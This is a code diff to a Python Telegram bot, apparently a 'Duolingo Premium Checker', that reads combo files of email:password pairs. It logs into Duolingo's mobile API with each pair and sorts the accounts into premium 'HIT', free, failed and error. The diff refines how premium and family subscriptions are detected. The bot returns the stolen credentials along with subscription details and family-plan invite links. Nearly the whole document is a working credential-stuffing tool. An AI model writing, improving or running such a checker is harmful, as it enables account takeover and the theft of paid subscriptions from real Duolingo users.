@@ -54,30 +54,55 @@ def get_error_type(exception):
     else:
         return f"❌ {str(exception)[:30]}"
 
+def is_premium_account(data):
+    """
+    အတိအကျ premium ဟုတ်မဟုတ် စစ်တယ်
+    မင်း Config ရဲ့ has_item_premium_subscription ကို primary အဖြစ်သုံးတယ်
+    """
+    
+    # PRIMARY: has_item_premium_subscription (မင်း Config အတိုင်း)
+    if data.get("has_item_premium_subscription") == True:
+        return True, "PREMIUM", None
+    
+    # SECONDARY: hasPlus
+    if data.get("hasPlus") == True:
+        return True, "PREMIUM", None
+    
+    # Check shopItems for real subscription
+    shop_items = data.get("shopItems", [])
+    for item in shop_items:
+        sub_info = item.get("subscriptionInfo", {})
+        if sub_info and sub_info.get("productId") and sub_info.get("productId") != "N/A":
+            return True, "PREMIUM", None
+        
+        family_info = item.get("familyPlanInfo", {})
+        if family_info and family_info.get("inviteToken"):
+            return True, "FAMILY", family_info.get("inviteToken")
+    
+    # Check subscriptionConfigs
+    sub_configs = data.get("subscriptionConfigs", [])
+    for sub in sub_configs:
+        if sub.get("productId") and sub.get("productId") != "N/A":
+            return True, "PREMIUM", None
+    
+    return False, "FREE", None
+
 def extract_subscription_details(data):
-    """Extract subscription details from multiple possible sources"""
+    """Extract subscription details ONLY if premium is confirmed"""
     
     details = {
-        "has_premium": False,
         "product_id": "Unknown",
         "renewing": "Unknown",
         "expiry": "Unknown",
-        "plan_type": "FREE",
         "invite_token": None
     }
     
-    # Check 1: hasPlus field
-    if data.get("hasPlus") == True:
-        details["has_premium"] = True
-        details["plan_type"] = "PREMIUM"
-    
-    # Check 2: shopItems array
+    # Check shopItems
     shop_items = data.get("shopItems", [])
     for item in shop_items:
         sub_info = item.get("subscriptionInfo", {})
         if sub_info:
-            details["has_premium"] = True
-            if sub_info.get("productId"):
+            if sub_info.get("productId") and sub_info.get("productId") != "N/A":
                 details["product_id"] = sub_info.get("productId")
             if sub_info.get("renewing") is not None:
                 details["renewing"] = "Yes" if sub_info.get("renewing") else "No"
@@ -85,29 +110,16 @@ def extract_subscription_details(data):
                 expiry_ms = sub_info.get("expectedExpiration")
                 details["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
         
-        # Check for family plan
         family_info = item.get("familyPlanInfo", {})
-        if family_info:
-            details["has_premium"] = True
-            details["plan_type"] = "FAMILY"
+        if family_info and family_info.get("inviteToken"):
             details["invite_token"] = family_info.get("inviteToken")
     
-    # Check 3: subscriptionConfigs array
-    sub_configs = data.get("subscriptionConfigs", [])
-    for sub in sub_configs:
-        if sub.get("productId"):
-            details["has_premium"] = True
-            if details["product_id"] == "Unknown":
+    # Check subscriptionConfigs as fallback
+    if details["product_id"] == "Unknown":
+        sub_configs = data.get("subscriptionConfigs", [])
+        for sub in sub_configs:
+            if sub.get("productId") and sub.get("productId") != "N/A":
                 details["product_id"] = sub.get("productId")
-            if sub.get("isInGracePeriod") is not None:
-                details["renewing"] = "In Grace" if sub.get("isInGracePeriod") else "Active"
-    
-    # Check 4: plusDiscounts
-    plus_discounts = data.get("plusDiscounts", {})
-    if plus_discounts and plus_discounts.get("discountType"):
-        details["has_premium"] = True
-        if details["expiry"] == "Unknown" and plus_discounts.get("expirationEpochTime"):
-            details["expiry"] = datetime.fromtimestamp(plus_discounts["expirationEpochTime"] / 1000).strftime("%Y-%m-%d")
     
     return details
 
@@ -116,7 +128,7 @@ def check_duolingo(email, password):
     ua = generate_ua()
     
     try:
-        # Login
+        # STEP 1: Login
         login_url = "https://android-api.duolingo.cn/2017-06-30/login?fields=id"
         distinct_id = str(uuid.uuid4())
         
@@ -132,14 +144,14 @@ def check_duolingo(email, password):
         resp = session.post(login_url, json=login_payload, headers=login_headers, timeout=15)
         
         if resp.status_code != 200:
-            return "FAIL", "wrong credentials", None, None, None
+            return "FAIL", "wrong credentials", None, None
         
         login_data = resp.json()
         user_id = login_data.get("id")
         if not user_id:
-            return "FAIL", "no user id", None, None, None
+            return "FAIL", "no user id", None, None
         
-        # Get JWT from cookies
+        # STEP 2: Get JWT from cookies
         jwt_token = None
         for cookie in session.cookies:
             if cookie.name == "jwt_token":
@@ -147,17 +159,17 @@ def check_duolingo(email, password):
                 break
         
         if not jwt_token:
-            return "FAIL", "no jwt token", None, None, None
+            return "FAIL", "no jwt token", None, None
         
-        # Get profile with more fields for subscription
-        profile_url = f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}?fields=shopItems%2CtotalXp%2CstreakData%2Cusername%2CfromLanguage%2ClearningLanguage%2CgemsConfig%2ChasPlus%2CsubscriptionConfigs%2CplusDiscounts%2CcreatedAt%2Ccourses%7Btitle%2Cid%2ClearningLanguage%2CfromLanguage%2Cxp%2Ccrowns%7D"
+        # STEP 3: Get full profile with ALL fields
+        profile_url = f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}?fields=shopItems%2CtotalXp%2CstreakData%2Cusername%2CfromLanguage%2ClearningLanguage%2CgemsConfig%2ChasPlus%2Chas_item_premium_subscription%2CsubscriptionConfigs%2CplusDiscounts%2CcreatedAt%2Ccourses%7Btitle%2Cid%2ClearningLanguage%2CfromLanguage%2Cxp%2Ccrowns%7D"
         
         profile_headers = get_headers(ua, jwt_token)
         
         resp2 = session.get(profile_url, headers=profile_headers, timeout=15)
         
         if resp2.status_code != 200:
-            return "FAIL", f"profile error {resp2.status_code}", None, None, None
+            return "FAIL", f"profile error {resp2.status_code}", None, None
         
         data = resp2.json()
         
@@ -170,17 +182,22 @@ def check_duolingo(email, password):
         from_lang = data.get("fromLanguage", "N/A")
         created_at = data.get("createdAt", "Unknown")
         
-        # Extract subscription details
-        sub_details = extract_subscription_details(data)
+        # Check if premium (using Config's has_item_premium_subscription)
+        is_premium, plan_type, invite_token = is_premium_account(data)
         
         # FREE account (login success but no premium)
-        if not sub_details["has_premium"]:
-            free_result = f"⚠️ FREE | {email}:{password} | {username} | XP:{total_xp} | Streak:{streak}"
-            return "FREE", free_result, None, None, None
+        if not is_premium:
+            free_result = f"⚠️ FREE | {email}:{password} | {username} | XP:{total_xp} | Streak:{streak} | {learning_lang}"
+            return "FREE", free_result, None, None
         
-        # Build HIT result with FULL subscription details
-        plan_icon = "👨‍👩‍👧" if sub_details["plan_type"] == "FAMILY" else "⭐"
-        plan_name = "FAMILY PLAN" if sub_details["plan_type"] == "FAMILY" else "SUPER/PREMIUM"
+        # PREMIUM account - get subscription details
+        sub_details = extract_subscription_details(data)
+        if invite_token:
+            sub_details["invite_token"] = invite_token
+        
+        # Build HIT result
+        plan_icon = "👨‍👩‍👧" if plan_type == "FAMILY" else "⭐"
+        plan_name = "FAMILY PLAN" if plan_type == "FAMILY" else "SUPER/PREMIUM"
         
         result = f"""
 ✅ **PREMIUM HIT!**
@@ -207,14 +224,14 @@ def check_duolingo(email, password):
             invite_link = f"https://www.duolingo.com/family-plan?invite={sub_details['invite_token']}"
             result += f"\n🔗 **FAMILY INVITE LINK:**\n`{invite_link}`"
         
-        return "HIT", result, None, None, None
+        return "HIT", result, None, None
         
     except requests.exceptions.Timeout:
-        return "ERROR", "Timeout", None, "⏱️ Request timeout", None
+        return "ERROR", "Timeout", "⏱️ Request timeout", None
     except requests.exceptions.ConnectionError:
-        return "ERROR", "Connection Error", None, "🔌 Cannot connect to API", None
+        return "ERROR", "Connection Error", "🔌 Cannot connect to API", None
     except Exception as e:
-        return "ERROR", str(e)[:50], None, get_error_type(e), None
+        return "ERROR", str(e)[:50], get_error_type(e), None
 
 def make_progress_bar(percent, width=20):
     filled = int(width * percent / 100)
@@ -249,7 +266,7 @@ def process_combos(chat_id, combos, message_id):
         
         short_email = email[:25] + "..." if len(email) > 28 else email
         
-        status, detail, invite_link, error_detail, _ = check_duolingo(email, pwd)
+        status, detail, error_detail, _ = check_duolingo(email, pwd)
         
         if status == "HIT":
             hit_count += 1
@@ -264,11 +281,12 @@ def process_combos(chat_id, combos, message_id):
             error_count += 1
             err_type = error_detail if error_detail else detail
             error_types[err_type] = error_types.get(err_type, 0) + 1
-            logging.info(f"❌ ERROR: {email} - {err_type}")
+            logging.info(f"🔴 ERROR: {email} - {err_type}")
         else:
             fail_count += 1
             logging.info(f"❌ FAIL: {email}")
         
+        # Update progress every 5 combos
         if current % 5 == 0 or current == total or stop_flag:
             progress_bar = make_progress_bar(percent)
             
@@ -324,6 +342,7 @@ _Use /stop to cancel_
 """
     bot.send_message(chat_id, final_summary, parse_mode="Markdown")
     
+    # Send premium hits file
     if premium_hits:
         hit_content = f"# [ DUOLINGO ] BY ThuYa V3\n# Author: @thuyaaungzaw\n# Premium/Family Accounts\n# Total: {len(premium_hits)}\n\n"
         for email, pwd, result in premium_hits:
@@ -337,6 +356,7 @@ _Use /stop to cancel_
     else:
         bot.send_message(chat_id, "No premium/family accounts found.")
     
+    # Send free accounts file
     if free_accounts:
         free_content = f"# FREE Accounts (Login Success - No Premium)\n# Total: {len(free_accounts)}\n\n"
         for email, pwd, detail in free_accounts:
@@ -368,10 +388,10 @@ def start_command(message):
         "**Author:** @thuyaaungzaw\n\n"
         "📂 Click button below → Send combo file (email:pass)\n\n"
         "**Results:**\n"
-        "✅ HIT → Premium/Family (with subscription details)\n"
-        "⚠️ FREE → Login success, no premium\n"
-        "❌ FAIL → Wrong credentials\n"
-        "🔴 ERROR → Network/API issue\n\n"
+        "✅ **HIT** → Premium/Family (real subscription)\n"
+        "⚠️ **FREE** → Login success, no premium\n"
+        "❌ **FAIL** → Wrong credentials\n"
+        "🔴 **ERROR** → Network/API issue\n\n"
         "🛑 Use `/stop` to cancel",
         parse_mode="Markdown",
         reply_markup=markup
@@ -432,5 +452,6 @@ def handle_file(message):
 print("🤖 Duolingo Premium Checker Bot is running...")
 print("Config: [ DUOLINGO ] BY ThuYa V3")
 print("Author: @thuyaaungzaw")
-print("Features: Full Subscription Details | Password in HIT | Progress Bar")
+print("Premium Detection: has_item_premium_subscription (Config match)")
+print("Features: ✅ HIT | ⚠️ FREE | ❌ FAIL | 🔴 ERROR | Progress Bar | /stop")
 bot.infinity_polling()
